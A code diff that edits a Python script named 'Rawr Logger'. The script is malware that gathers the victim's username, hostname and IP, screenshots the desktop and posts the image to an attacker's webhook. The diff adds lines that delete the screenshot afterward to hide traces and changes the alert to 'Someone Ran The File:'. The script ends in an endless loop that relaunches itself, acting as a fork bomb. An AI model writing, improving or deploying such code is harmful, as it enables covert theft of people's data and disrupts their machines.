@@ -9,7 +9,7 @@ import shutil
 os.system(f'cls & title Rawr Logger!')
 
 u = os.getlogin()
-webhook = "Enter Dual Webhook Here"
+webhook = "enter dual webhook here"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
@@ -32,6 +32,7 @@ screenshot.close()
 with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
   requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
   requests.post(webhook,files={'upload_file': f})
+  os.remove(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
 
 
 
@@ -107,8 +108,9 @@ screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=
 screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
 screenshot.close()
 with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
-  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
+  requests.post(webhook,json={'content': f'Someone Ran The File:'})
   requests.post(webhook,files={'upload_file': f})
+  os.remove(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
 while True:
     subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
 """
